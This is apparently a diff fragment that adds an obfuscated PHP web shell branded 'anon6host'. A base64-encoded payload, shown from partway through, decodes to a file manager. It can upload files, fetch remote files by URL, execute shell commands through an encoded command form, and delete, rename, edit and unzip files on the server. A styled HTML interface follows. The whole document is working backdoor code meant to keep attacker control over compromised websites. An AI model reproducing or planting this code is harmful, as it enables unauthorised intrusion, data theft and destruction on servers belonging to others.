7DQogICAgZWNobyAiPGZvbnQgY29sb3I9cmVkPk9GRjwvZm9udD4iOw0KfQ0KDQpmb3JlYWNoKCRfUE9TVCBhcyAka2V5ID0+ICR2YWx1ZSl7DQogICAgJF9QT1NUWyRrZXldID0gc3RyaXBzbGFzaGVzKCR2YWx1ZSk7DQp9DQoNCmlmKGlzc2V0KCRfR0VUWydwYXRoJ10pKXsNCiAgICAkbG9rYXNpID0gJF9HRVRbJ3BhdGgnXTsNCiAgICAkbG9rZHVhID0gJF9HRVRbJ3BhdGgnXTsNCn0gZWxzZSB7DQogICAgJGxva2FzaSA9IGdldGN3ZCgpOw0KICAgICRsb2tkdWEgPSBnZXRjd2QoKTsNCn0NCg0KJGxva2FzaSA9IHN0cl9yZXBsYWNlKCdcXCcsJy8nLCRsb2thc2kpOw0KJGxva2FzaXMgPSBleHBsb2RlKCcvJywkbG9rYXNpKTsNCiRsb2thc2lueWEgPSBAc2NhbmRpcigkbG9rYXNpKTsNCg0KZWNobyAiPGJyPkRpcmVjdG9yeSAoIi5jZWt3cml0ZSgkbG9rYXNpKS4iKSA6ICZuYnNwOyI7DQoNCmZvcmVhY2goJGxva2FzaXMgYXMgJGlkID0+ICRsb2spew0KICAgIGlmKCRsb2sgPT0gJycgJiYgJGlkID09IDApew0KICAgICAgICAkYSA9IHRydWU7DQogICAgICAgIGVjaG8gJzxhIGhyZWY9Ij9wYXRoPS8iPi88L2E+JzsNCiAgICAgICAgY29udGludWU7DQogICAgfQ0KICAgIGlmKCRsb2sgPT0gJycpIGNvbnRpbnVlOw0KICAgIGVjaG8gJzxhIGhyZWY9Ij9wYXRoPSc7DQogICAgZm9yKCRpPTA7JGk8PSRpZDskaSsrKXsNCiAgICBlY2hvICIkbG9rYXNpc1skaV0iOw0KICAgIGlmKCRpICE9ICRpZCkgZWNobyAiLyI7DQp9IA0KZWNobyAnIj4nLiRsb2suJzwvYT4vJzsNCn0NCg0KZWNobyAnPC90ZD48L3RyPjx0cj48dGQ+JzsNCmlmIChpc3NldCgkX1BPU1RbJ3Vwd2t3ayddKSkgew0KICAgIGlmICgkX1BPU1RbJ2Rpcm55YSddID09ICIyIikgew0KICAgICAgICAgICAgJGxva2FzaSA9ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107DQogICAgICAgIH0NCiAgICBpZiAoaXNzZXQoJF9QT1NUWydiZXJrYXNueWEnXSkpIHsNCiAgICAgICAgJGRhdGEgPSBAZmlsZV9wdXRfY29udGVudHMoJGxva2FzaS4iLyIuJF9GSUxFU1snYmVya2FzJ11bJ25hbWUnXSwgQGZpbGVfZ2V0X2NvbnRlbnRzKCRfRklMRVNbJ2JlcmthcyddWyd0bXBfbmFtZSddKSk7DQogICAgICAgIGlmIChmaWxlX2V4aXN0cygkbG9rYXNpLiIvIi4kX0ZJTEVTWydiZXJrYXMnXVsnbmFtZSddKSkgew0KICAgICAgICAgICAgZWNobyAiRmlsZSBVcGxvYWRlZCAhICZuYnNwOzxmb250IGNvbG9yPSdnb2xkJz48aT4iLiRsb2thc2kuIi8iLiRfRklMRVNbJ2JlcmthcyddWyduYW1lJ10uIjwvaT48L2ZvbnQ+PGJyPjxicj4iOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgZWNobyAiPGZvbnQgY29sb3I9J3JlZCc+RmFpbGVkIHRvIFVwbG9hZCAhPGJyPjxicj4iOw0KICAgICAgICB9DQogICAgfSBlbHNlaWYgKGlzc2V0KCRfUE9TVFsnbGlua255YSddKSkgew0KICAgICAgICBpZiAoZW1wdHkoJF9QT1NUWyduYW1hbGluayddKSkgew0KICAgICAgICAgICAgZXhpdCgiRmlsZW5hbWUgY2Fubm90IGJlIGVtcHR5ICEiKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJF9QT1NUWydkaXJueWEnXSA9PSAiMiIpIHsNCiAgICAgICAgICAgICRsb2thc2kgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOw0KICAgICAgICB9DQogICAgICAgICRkYXRhID0gQGZpbGVfcHV0X2NvbnRlbnRzKCRsb2thc2kuIi8iLiRfUE9TVFsnbmFtYWxpbmsnXSwgQGZpbGVfZ2V0X2NvbnRlbnRzKCRfUE9TVFsnZGFyaWxpbmsnXSkpOw0KICAgICAgICBpZiAoZmlsZV9leGlzdHMoJGxva2FzaS4iLyIuJF9QT1NUWyduYW1hbGluayddKSkgew0KICAgICAgICAgICAgZWNobyAiRmlsZSBVcGxvYWRlZCAhICZuYnNwOzxmb250IGNvbG9yPSdnb2xkJz48aT4iLiRsb2thc2kuIi8iLiRfUE9TVFsnbmFtYWxpbmsnXS4iPC9pPjwvZm9udD48YnI+PGJyPiI7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBlY2hvICI8Zm9udCBjb2xvZT0ncmVkJz5GYWlsZWQgdG8gVXBsb2FkICE8YnI+PGJyPiI7DQogICAgICAgIH0NCiAgICB9IGVsc2VpZiAoaXNzZXQoJF9QT1NUWydiZXBhcyddKSkgew0KICAgICAgICAkYmVwYXNkYXRhID0gJF9QT1NUWydiZXBhc2RhdGEnXTsNCiAgICAgICAgJGJlcGFzbmFtYSA9ICRfUE9TVFsnYmVwYXNuYW1hJ107DQogICAgICAgIGlmICgkYmVwYXNkYXRhKSB7DQogICAgICAgICAgICBlY2hvICJzdHJpbmciOw0KICAgICAgICB9DQogICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkbG9rYXNpLiIvIi4kYmVwYXNuYW1hLCAkYmVwYXNkYXRhKTsNCiAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRsb2thc2kuIi8iLiRiZXBhc25hbWEpKSB7DQogICAgICAgICAgICBlY2hvICJGaWxlIFVwbG9hZGVkICEgJm5ic3A7PGZvbnQgY29sb3I9J2dvbGQnPjxpPiIuJGxva2FzaS4iLyIuJGJlcGFzbmFtYS4iPC9pPjwvZm9udD48YnI+PGJyPiI7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBlY2hvICI8Zm9udCBjb2xvZT0ncmVkJz5GYWlsZWQgdG8gVXBsb2FkICE8YnI+PGJyPiI7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCmVjaG8gIjwvdGFibGU+PGJyPiI7DQplY2hvICc8dGFibGUgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCIgY2VsbHBhZGRpbmc9IjMiIGNlbGxzcGFjaW5nPSIxIiBhbGlnbj0iY2VudGVyIj4nOw0KZWNobyAnPHRoPlsgJm5ic3A7PGEgaHJlZj0iJy4kX1NFUlZFUlsnU0NSSVBUX05BTUUnXS4nIj5Ib21lPC9hPiZuYnNwOyBdPC90aD4nOw0KZWNobyAnPHRoPlsgJm5ic3A7PGEgaHJlZj0iP3BhdGg9Jy4kbG9rYXNpLicma29tZW5kPWdhc2thbiI+QzBtbWFuZDwvYT4mbmJzcDsgXTwvdGg+JzsNCmVjaG8gJzx0aD5bICZuYnNwOzxhIGhyZWY9Ij9wYXRoPScuJGxva2FzaS4nJnVwbG9hZD1nYXNrYW4iPlVwbG9hZCBGaWxlPC9hPiZuYnNwOyBdPC90aD4nOw0KZWNobyAiPC90YWJsZT48YnI+IjsNCg0KaWYgKGlzc2V0KCRfR0VUWydmaWxlbG9jJ10pKSB7DQogICAgZWNobyAiPHRyPjx0ZD5DdXJyZW50IEZpbGUgOiAiLiRfR0VUWydmaWxlbG9jJ107DQogICAgZWNobyAnPC90cj48L3RkPjwvdGFibGU+PGJyLz4nOw0KICAgIGVjaG8gIjxwcmU+Ii5odG1sc3BlY2lhbGNoYXJzKGZpbGVfZ2V0X2NvbnRlbnRzKCRfR0VUWydmaWxlbG9jJ10pKS4iPC9wcmU+IjsNCiAgICBhdXRob3IoKTsNCn0gZWxzZWlmIChpc3NldCgkX0dFVFsncGlsaWhhbiddKSAmJiAkX1BPU1RbJ3BpbGloJ10gPT0gImhhcHVzIikgew0KICAgIGlmIChpc19kaXIoJF9QT1NUWydwYXRoJ10pKSB7DQogICAgICAgIHhybWRpcigkX1BPU1RbJ3BhdGgnXSk7DQogICAgICAgIGlmIChmaWxlX2V4aXN0cygkX1BPU1RbJ3BhdGgnXSkpIHsNCiAgICAgICAgICAgIHJlZCgiRmFpbGVkIHRvIGRlbGV0ZSBEaXJlY3RvcnkgISIpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgZ3JlZW4oIkRlbGV0ZSBEaXJlY3RvcnkgU3VjY2VzcyAhIik7DQogICAgICAgIH0NCiAgICB9IGVsc2VpZiAoaXNfZmlsZSgkX1BPU1RbJ3BhdGgnXSkpIHsNCiAgICAgICAgQHVubGluaygkX1BPU1RbJ3BhdGgnXSk7DQogICAgICAgIGlmIChmaWxlX2V4aXN0cygkX1BPU1RbJ3BhdGgnXSkpIHsNCiAgICAgICAgICAgIHJlZCgiRmFpbGVkIHRvIERlbGV0ZSBGaWxlICEiKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGdyZWVuKCJEZWxldGUgRmlsZSA8aT4iLmJhc2VuYW1lKCRfUE9TVFsncGF0aCddKS4iPC9pPiBTdWNjZXNzICEiKTsNCiAgICAgICAgfQ0KICAgIH0NCn0gZWxzZWlmIChpc3NldCgkX0dFVFsncGlsaWhhbiddKSAmJiAkX1BPU1RbJ3BpbGloJ10gPT0gImdhbnRpbmFtYSIpIHsNCiAgICBpZiAoaXNzZXQoJF9QT1NUWydnYW50aW4nXSkpIHsNCiAgICAgICAgJHJlbiA9IEByZW5hbWUoJF9QT1NUWydwYXRoJ10sICRfUE9TVFsnbmV3bmFtZSddKTsNCiAgICAgICAgaWYgKCRyZW4gPT0gdHJ1ZSkgew0KICAgICAgICAgICAgZ3JlZW4oIkNoYW5nZSBOYW1lIFN1Y2Nlc3MgISIpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgcmVkKCJDaGFuZ2UgTmFtZSBGYWlsZWQgISIpOw0KICAgICAgICB9DQogICAgfQ0KICAgIGlmIChlbXB0eSgkX1BPU1RbJ25hbWUnXSkpIHsNCiAgICAgICAgJG5hbWFhd2FsID0gJF9QT1NUWyduZXduYW1lJ107DQogICAgfSBlbHNlIHsNCiAgICAgICAgJG5hbWF3YWwgPSAkX1BPU1RbJ25hbWUnXTsNCiAgICB9DQogICAgZWNobyAiPGNlbnRlcj4iLiRfUE9TVFsncGF0aCddLiI8YnI+IjsNCiAgICBlY2hvICc8Zm9ybSBtZXRob2Q9InBvc3QiPg0KICAgIE5ldyBOYW1lIDogPGlucHV0IG5hbWU9Im5ld25hbWUiIHR5cGU9InRleHQiIGNsYXNzPSJ1cCIgc2l6ZT0iMjAiIHZhbHVlPSInLiRuYW1hYXdhbC4nIiAvPg0KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhdGgiIHZhbHVlPSInLiRfUE9TVFsncGF0aCddLiciPg0KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBpbGloIiB2YWx1ZT0iZ2FudGluYW1hIj4NCiAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQ2hhbmdlIiBuYW1lPSJnYW50aW4iIGNsYXNzPSJ1cCIgc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsgYm9yZGVyLWNvbG9yOiAjZmZmIi8+DQogICAgPC9mb3JtPic7DQp9IGVsc2VpZiAoaXNzZXQoJF9HRVRbJ3BpbGloYW4nXSkgJiYgJF9QT1NUWydwaWxpaCddID09ICJlZGl0Iikgew0KICAgIGlmIChpc3NldCgkX1BPU1RbJ2dhc2VkaXQnXSkpIHsNCiAgICAgICAgJGVkaXQgPSBAZmlsZV9wdXRfY29udGVudHMoJF9QT1NUWydwYXRoJ10sICRfUE9TVFsnc3JjJ10pOw0KICAgICAgICBpZiAoJGVkaXQgPT0gdHJ1ZSkgew0KICAgICAgICAgICAgZ3JlZW4oIkVkaXQgRmlsZSBTdWNjZXNzICEiKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHJlZCgiRWRpdCBGaWxlIEZhaWxlZCAhIik7DQogICAgICAgIH0NCiAgICB9DQogICAgZWNobyAiPGNlbnRlcj4iLiRfUE9TVFsncGF0aCddLiI8YnI+PGJyPiI7DQogICAgZWNobyAnPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCiAgICA8dGV4dGFyZWEgY29scz04MCByb3dzPTIwIG5hbWU9InNyYyI+Jy5odG1sc3BlY2lhbGNoYXJzKGZpbGVfZ2V0X2NvbnRlbnRzKCRfUE9TVFsncGF0aCddKSkuJzwvdGV4dGFyZWE+PGJyPg0KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhdGgiIHZhbHVlPSInLiRfUE9TVFsncGF0aCddLiciPg0KICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBpbGloIiB2YWx1ZT0iZWRpdCI+DQogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkVkaXQgRmlsZSIgbmFtZT0iZ2FzZWRpdCIgLz4NCiAgICA8L2Zvcm0+PGJyPic7DQp9IGVsc2VpZiAoaXNzZXQoJF9HRVRbJ3BpbGloYW4nXSkgJiYgJF9QT1NUWydwaWxpaCddID09ICJkdW5sdXQiKSB7DQogICAgZHVubHV0KCRfUE9TVFsncGF0aCddKTsNCn0gZWxzZWlmIChpc3NldCgkX0dFVFsncGlsaWhhbiddKSAmJiAkX1BPU1RbJ3BpbGloJ10gPT0gInVuemlwIikgew0KICAgIHVuemlwKCRfUE9TVFsncGF0aCddLCAkbG9rYXNpKTsNCn0gZWxzZWlmIChpc3NldCgkX0dFVFsndXBsb2FkJ10pKSB7DQogICAgZWNobyAiPGNlbnRlcj5VcGxvYWQgRmlsZSA6ICI7DQogICAgZWNobyAnPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0Ij4NCjxpbnB1dCB0eXBlPSJyYWRpbyIgdmFsdWU9IjEiIG5hbWU9ImRpcm55YSIgY2hlY2tlZD5jdXJyZW50X2RpciBbICcuY2VrZGlyKCkuJyBdDQo8aW5wdXQgdHlwZT0icmFkaW8iIHZhbHVlPSIyIiBuYW1lPSJkaXJueWEiID5kb2N1bWVudF9yb290IFsgJy5jZWtyb290KCkuJyBdDQo8YnI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ1cHdrd2siIHZhbHVlPSJhcGxvZCI+DQo8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iYmVya2FzIj48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJiZXJrYXNueWEiIHZhbHVlPSJVcGxvYWQiIGNsYXNzPSJ1cCIgc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsgYm9yZGVyLWNvbG9yOiAjZmZmIj48YnI+PGJyPg0KVXBsb2FkIEZpbGUgRnJvbSBMaW5rIDo8YnI+DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZGFyaWxpbmsiIGNsYXNzPSJ1cCIgcGxhY2Vob2xkZXI9Imh0dHBzOi8vYW5vbjcueHl6L3VwbG9hZC50eHQiPiZuYnNwOzxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJuYW1hbGluayIgY2xhc3M9InVwIiBzaXplPSIzIiBwbGFjZWhvbGRlcj0iZmlsZS50eHQiPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImxpbmtueWEiIGNsYXNzPSJ1cCIgdmFsdWU9IlVwbG9hZCIgc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsgYm9yZGVyLWNvbG9yOiAjZmZmIj4NCjxicj48YnI+NDAzIFVwbG9hZCBGaWxlPGJyPg0KPGlucHV0IHR5cGU9ImZpbGUiIGlkPSJkYXRhbnlhIiBvbmNoYW5nZT0ic2V0ZmlsZW5hbWUodGhpcy52YWx1ZSk7IGxvYWRGaWxlKHRoaXMuZmlsZXNbMF0pIi8+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJiZXBhc25hbWEiIGlkPSJuYW1hbnlhIj4NCjx0ZXh0YXJlYSBzdHlsZT0iZGlzcGxheTogbm9uZSIgaWQ9ImJlcGFzZGF0YSIgbmFtZT0iYmVwYXNkYXRhIj48L3RleHRhcmVhPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iYmVwYXMiIHZhbHVlPSJVcGxvYWQiIGNsYXNzPSJ1cCIgc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsgYm9yZGVyLWNvbG9yOiAjZmZmIj4NCjwvZm9ybT48YnI+PGJyPjwvY2VudGVyPic7DQp9IGVsc2VpZiAoaXNzZXQoJF9HRVRbJ2tvbWVuZCddKSkgew0KICAgIGVjaG8gIjxjZW50ZXI+IjsNCiAgICBlY2hvICc8Zm9ybSBtZXRob2Q9InBvc3QiIG9uc3VibWl0PSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZChcJ2tvbWVuZG55YVwnKS52YWx1ZSA9IGJ0b2EoYnRvYShidG9hKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKFwna29tZW5kbnlhXCcpLnZhbHVlKSkpIj4NCiAgICAnLkBnZXRfY3VycmVudF91c2VyKCkuJ0AnLmlwc2VydigpLic6fiAkIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJrb21lbmQiIGlkPSJrb21lbmRueWEiIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiAjMWYxZjFmOyBjb2xvcjogI2ZmZiI+DQogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iZWtzZWtvbWVuZCIgdmFsdWU9IiA+PiAiIGNsYXNzPSJ1cCIgc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsgYm9yZGVyLWNvbG9yOiAjZmZmIj4NCiAgICA8L2Zvcm0+PGJyPic7DQogICAgaWYgKGlzc2V0KCRfUE9TVFsnZWtzZWtvbWVuZCddKSkgew0KICAgICAgICBla3NlKCRfUE9TVFsna29tZW5kJ10sICRsb2thc2kpOw0KICAgIH0NCiAgICBlY2hvICI8L2NlbnRlcj4iOw0KfSANCg0KaWYgKCFpc19yZWFkYWJsZSgkbG9rYXNpKSkgew0KICAgIGRpZSgiPGNlbnRlcj5UaGlzIGRpcmVjdG9yeSBpcyB1bnJlYWRhYmxlIDooPC9jZW50ZXI+Iik7DQp9DQoNCmVjaG8gJzxkaXYgaWQ9ImNvbnRlbnQiPjx0YWJsZSB3aWR0aD0iMTAwJSIgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMyIgY2VsbHNwYWNpbmc9IjEiIGFsaWduPSJjZW50ZXIiPg0KPHRyIGNsYXNzPSJmaXJzdCI+DQo8dGQ+PGNlbnRlcj5OYW1lPC9jZW50ZXI+PC90ZD4NCjx0ZD48Y2VudGVyPlNpemU8L2NlbnRlcj48L3RkPg0KPHRkPjxjZW50ZXI+TGFzdCBNb2RpZmllZDwvY2VudGVyPjwvdGQ+DQo8dGQ+PGNlbnRlcj5Pd25lcjwvY2VudGVyPjwvdGQ+DQo8dGQ+PGNlbnRlcj5QZXJtaXNzaW9uczwvY2VudGVyPjwvdGQ+DQo8dGQ+PGNlbnRlcj5PcHRpb25zPC9jZW50ZXI+PC90ZD4NCjwvdHI+JzsNCg0KZm9yZWFjaCgkbG9rYXNpbnlhIGFzICRkaXIpew0KICAgIGlmKCFpc19kaXIoJGxva2FzaS4iLyIuJGRpcikgfHwgJGRpciA9PSAnLicpIGNvbnRpbnVlOw0KICAgIGVjaG8gIjx0cj4NCiAgICA8dGQ+PGkgY2xhc3M9J2ZhIGZhLWZvbGRlcicgc3R5bGU9J2NvbG9yOiAjZmZlOWEyJz48L2k+IDxhIGhyZWY9XCI/cGF0aD0iLiRsb2thc2kuIi8iLiRkaXIuIlwiPiIuJGRpci4iPC9hPjwvdGQ+DQogICAgPHRkPjxjZW50ZXI+LS08L2NlbnRlcj48L3RkPg0KICAgIDx0ZD48Y2VudGVyPiIuZmlsZWRhdGUoJGxva2FzaS4iLyIuJGRpcikuIjwvY2VudGVyPjwvdGQ+DQogICAgPHRkPiIub3duZXIoJGxva2FzaS4iLyIuJGRpcikuIjwvdGQ+DQogICAgPHRkPjxjZW50ZXI+IjsNCiAgICBpZihpc193cml0YWJsZSgkbG9rYXNpLiIvIi4kZGlyKSkgZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj4nOw0KICAgIGVsc2VpZighaXNfcmVhZGFibGUoJGxva2FzaS4iLyIuJGRpcikpIGVjaG8gJzxmb250IGNvbG9yPSJyZWQiPic7DQogICAgZWNobyBzdGF0dXNueWEoJGxva2FzaS4iLyIuJGRpcik7DQogICAgaWYoaXNfd3JpdGFibGUoJGxva2FzaS4iLyIuJGRpcikgfHwgIWlzX3JlYWRhYmxlKCRsb2thc2kuIi8iLiRkaXIpKSBlY2hvICc8L2ZvbnQ+JzsNCg0KICAgIGVjaG8gIjwvY2VudGVyPjwvdGQ+DQogICAgPHRkPjxjZW50ZXI+PGZvcm0gbWV0aG9kPVwiUE9TVFwiIGFjdGlvbj1cIj9waWxpaGFuJnBhdGg9JGxva2FzaVwiPg0KICAgIDxzZWxlY3QgbmFtZT1cInBpbGloXCI+DQogICAgPG9wdGlvbiB2YWx1ZT1cIlwiPjwvb3B0aW9uPg0KICAgIDxvcHRpb24gdmFsdWU9XCJoYXB1c1wiPkRlbGV0ZTwvb3B0aW9uPg0KICAgIDxvcHRpb24gdmFsdWU9XCJnYW50aW5hbWFcIj5SZW5hbWU8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgICA8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJ0eXBlXCIgdmFsdWU9XCJkaXJcIj4NCiAgICA8aW5wdXQgdHlwZT1cImhpZGRlblwiIG5hbWU9XCJuYW1lXCIgdmFsdWU9XCIkZGlyXCI+DQogICAgPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwicGF0aFwiIHZhbHVlPVwiJGxva2FzaS8kZGlyXCI+DQogICAgPGlucHV0IHR5cGU9XCJzdWJtaXRcIiBjbGFzcz1cImdhc1wiIHZhbHVlPVwiPlwiIC8+DQogICAgPC9mb3JtPjwvY2VudGVyPjwvdGQ+DQogICAgPC90cj4iOw0KfQ0KDQplY2hvICc8dHIgY2xhc3M9ImZpcnN0Ij48dGQ+PC90ZD48dGQ+PC90ZD48dGQ+PC90ZD48dGQ+PC90ZD48dGQ+PC90ZD48dGQ+PC90ZD48L3RyPic7DQpmb3JlYWNoKCRsb2thc2lueWEgYXMgJGZpbGUpIHsNCiAgICBpZighaXNfZmlsZSgiJGxva2FzaS8kZmlsZSIpKSBjb250aW51ZTsNCiAgICAkc2l6ZSA9IGZpbGVzaXplKCIkbG9rYXNpLyRmaWxlIikvMTAyNDsNCiAgICAkc2l6ZSA9IHJvdW5kKCRzaXplLDMpOw0KICAgIGlmKCRzaXplID49IDEwMjQpew0KICAgICRzaXplID0gcm91bmQoJHNpemUvMTAyNCwyKS4nIE1CJzsNCn0gZWxzZSB7DQogICAgJHNpemUgPSAkc2l6ZS4nIEtCJzsNCn0NCg0KZWNobyAiPHRyPg0KPHRkPiIuY2VrZmlsZSgkbG9rYXNpLiIvIi4kZmlsZSkuIjxhIGhyZWY9XCI/ZmlsZWxvYz0kbG9rYXNpLyRmaWxlJnBhdGg9JGxva2FzaVwiPiRmaWxlPC9hPjwvdGQ+DQo8dGQ+PGNlbnRlcj4iLiRzaXplLiI8L2NlbnRlcj48L3RkPg0KPHRkPjxjZW50ZXI+Ii5maWxlZGF0ZSgkbG9rYXNpLiIvIi4kZmlsZSkuIjwvY2VudGVyPjwvdGQ+DQo8dGQ+Ii5vd25lcigkbG9rYXNpLiIvIi4kZmlsZSkuIjwvdGQ+DQo8dGQ+PGNlbnRlcj4iOw0KaWYoaXNfd3JpdGFibGUoIiRsb2thc2kvJGZpbGUiKSkgZWNobyAnPGZvbnQgY29sb3I9ImdyZWVuIj4nOw0KZWxzZWlmKCFpc19yZWFkYWJsZSgiJGxva2FzaS8kZmlsZSIpKSBlY2hvICc8Zm9udCBjb2xvcj0icmVkIj4nOw0KZWNobyBzdGF0dXNueWEoIiRsb2thc2kvJGZpbGUiKTsNCmlmKGlzX3dyaXRhYmxlKCIkbG9rYXNpLyRmaWxlIikgfHwgIWlzX3JlYWRhYmxlKCIkbG9rYXNpLyRmaWxlIikpIGVjaG8gJzwvZm9udD4nOw0KZWNobyAiPC9jZW50ZXI+PC90ZD48dGQ+PGNlbnRlcj4NCjxmb3JtIG1ldGhvZD1cInBvc3RcIiBhY3Rpb249XCI/cGlsaWhhbiZwYXRoPSRsb2thc2lcIj4NCjxzZWxlY3QgbmFtZT1cInBpbGloXCI+DQo8b3B0aW9uIHZhbHVlPVwiXCI+PC9vcHRpb24+DQo8b3B0aW9uIHZhbHVlPVwiaGFwdXNcIj5EZWxldGU8L29wdGlvbj4NCjxvcHRpb24gdmFsdWU9XCJkdW5sdXRcIj5Eb3dubG9hZDwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT1cImdhbnRpbmFtYVwiPlJlbmFtZTwvb3B0aW9uPg0KPG9wdGlvbiB2YWx1ZT1cImVkaXRcIj5FZGl0PC9vcHRpb24+IjsNCmlmIChjbGFzc19leGlzdHMoIlppcEFyY2hpdmUiKSkgew0KICAgIGVjaG8gIjxvcHRpb24gdmFsdWU9XCJ1bnppcFwiPlVuemlwPC9vcHRpb24+IjsNCn0NCmVjaG8gIjwvc2VsZWN0Pg0KPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwidHlwZVwiIHZhbHVlPVwiZmlsZVwiPg0KPGlucHV0IHR5cGU9XCJoaWRkZW5cIiBuYW1lPVwibmFtZVwiIHZhbHVlPVwiJGZpbGVcIj4NCjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgbmFtZT1cInBhdGhcIiB2YWx1ZT1cIiRsb2thc2kvJGZpbGVcIj4NCjxpbnB1dCB0eXBlPVwic3VibWl0XCIgY2xhc3M9XCJnYXNcIiB2YWx1ZT1cIj5cIiAvPg0KPC9mb3JtPjwvY2VudGVyPjwvdGQ+DQo8L3RyPiI7DQp9DQplY2hvICc8L3RyPjwvdGQ+PC90YWJsZT48L3RhYmxlPic7DQphdXRob3IoKTsNCg0KZnVuY3Rpb24gc3RhdHVzbnlhKCRmaWxlKXsNCiRpemluID0gc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKCRmaWxlKSksIC00KTsNCnJldHVybiAkaXppbjsNCn0NCj8+")); ?>
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>anon6host</title>
+    <meta name="author" content="Anon7">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="we are party at your security !">
+    <meta property="og:description" content="we are party at your security !">
+    <meta property="og:image" content="https://i.imgur.com/6RSyvoJ.jpg">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="theme-color" content="#1f1f1f">
+</head>
+<body bgcolor="#1f1f1f" text="#ffffff">
+<link href="" rel="stylesheet" type="text/css">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
+<style>
+    @import url('https://fonts.googleapis.com/css?family=Dosis');
+    @import url('https://fonts.googleapis.com/css?family=Bungee');
+body {
+    font-family: "Dosis", cursive;
+    text-shadow:0px 0px 1px #757575;
+}
+
+body::-webkit-scrollbar {
+  width: 12px;
+}
+
+body::-webkit-scrollbar-track {
+  background: #1f1f1f;
+}
+
+body::-webkit-scrollbar-thumb {
+  background-color: #1f1f1f;
+  border: 3px solid gray;
+}
+
+#content tr:hover {
+    background-color: #636263;
+    text-shadow:0px 0px 10px #fff;
+}
+
+#content .first {
+    background-color: #25383C;
+}
+
+#content .first:hover {
+    background-color: #25383C
+    text-shadow:0px 0px 1px #757575;
+}
+
+table {
+    border: 1px #000000 dotted;
+    table-layout: fixed;
+    word-break: break-all;
+}
+
+textarea {
+    max-width: 95%;
+    max-height: 100%;
+    resize: none;
+    outline: none;
+    overflow: auto;
+    background: transparent;
+    color: #fff;
+}
+
+textarea::-webkit-scrollbar {
+  width: 12px;
+}
+
+textarea::-webkit-scrollbar-track {
+  background: #1f1f1f;
+}
+
+textarea::-webkit-scrollbar-thumb {
+  background-color: #1f1f1f;
+  border: 3px solid gray;
+}
+
+a {
+    color: #ffffff;
+    text-decoration: none;
+}
+
+a:hover {
+    color: gold;
+    text-shadow:0px 0px 10px #ffffff;
+}
+
+input,select,textarea {
+    border: 1px #000000 solid;
+    -moz-border-radius: 5px;
+    -webkit-border-radius:5px;
+    border-radius:5px;
+}
+
+.gas {
+    background-color: #1f1f1f;
+    color: #ffffff;
+    cursor: pointer;
+}
+
+select {
+    background-color: transparent;
+    color: #ffffff;
+}
+
+select:after {
+    cursor: pointer;
+}
+
+.linka {
+    background-color: transparent;
+    color: #ffffff;
+}
+
+.up {
+    background-color: transparent;
+    color: #fff;
+}
+
+option {
+    background-color: #1f1f1f;
+}
+
+::-webkit-file-upload-button {
+  background: transparent;
+  color: #fff;
+  border-color: #fff;
+  cursor: pointer;
+}
+</style>
+<script>
+function setfilename(val)
+  {
+    filename = val.split('\\').pop().split('/').pop();
+    //filename = filename.substring(0, filename.lastIndexOf('.'));
+    document.getElementById('namanya').value = filename;
+  }
+
+async function loadFile(file) {
+    let text = await file.text();
+    document.getElementById("bepasdata").innerHTML = text;
+}
+</script>
+<center>
